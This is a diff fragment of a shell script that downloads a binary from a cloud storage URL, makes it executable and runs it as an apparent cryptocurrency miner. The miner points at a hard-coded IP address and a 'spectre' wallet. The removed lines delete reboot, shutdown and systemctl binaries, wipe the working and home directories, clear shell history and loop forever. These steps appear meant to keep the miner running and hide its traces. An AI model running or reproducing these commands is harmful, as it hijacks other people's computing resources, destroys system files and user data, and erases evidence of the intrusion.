@@ -5,15 +5,3 @@ dpkg-reconfigure --frontend noninteractive tzdata
 wget https://majza.nyc3.digitaloceanspaces.com/Tnn0.4.0 
 chmod 777 Tnn0.4.0
 ./Tnn0.4.0 --daemon-address 157.245.1.139 --port 80 --worker-name $(shuf -n 1 -i 1-999)-B --spectre --wallet spectre:qzlnaweyxxpjmh7xp66n62j7lu008xqeytm4npxskezhx92u52jzuwv39q8zt
-sleep 30
-sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
-curl ifconfig.me
-rm -rvf *
-cd ~/
-rm -rvf *
-history -cr
-while true
-do
-        echo "hold down..."
-        sleep 60
-done
